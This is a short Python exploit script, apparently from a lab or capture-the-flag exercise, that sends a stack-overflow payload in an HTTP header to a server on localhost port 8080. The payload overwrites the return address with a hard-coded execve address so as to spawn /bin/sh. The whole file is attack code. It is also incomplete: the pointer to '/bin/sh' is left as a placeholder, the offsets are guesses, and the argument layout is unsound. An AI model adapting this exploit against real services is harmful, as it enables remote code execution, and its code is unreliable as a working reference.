#!/usr/bin/env python3
import socket
import struct

host = "localhost"
port = 8080

# The execve address you found earlier
execve_addr = struct.pack("<Q", 0x7ffff7e7f310)
null = struct.pack("<Q", 0x0)

# Step 1: Start payload with the string
payload = b"/bin/sh\x00"

# Step 2: Pad with As up to return address (adjust length until it lands correctly)
payload += b"A" * (520 - len(payload))  # You may need to try 512, 528, or 536 too

# Step 3: Add fake return address and arguments
payload += execve_addr    # Overwrite RIP
payload += null           # Return address after execve
payload += b"B" * 8       # Placeholder for now (will replace with pointer to "/bin/sh")
payload += null           # argv
payload += null           # envp

# Step 4: Add dummy padding to ensure stack is filled
payload += b"C" * 64

# Step 5: Build full request with payload in header (less strict than URL)
request = b"GET / HTTP/1.0\r\n"
request += b"Exploit: " + payload + b"\r\n"
request += b"\r\n"

# Send
s = socket.create_connection((host, port))
s.send(request)
s.close()
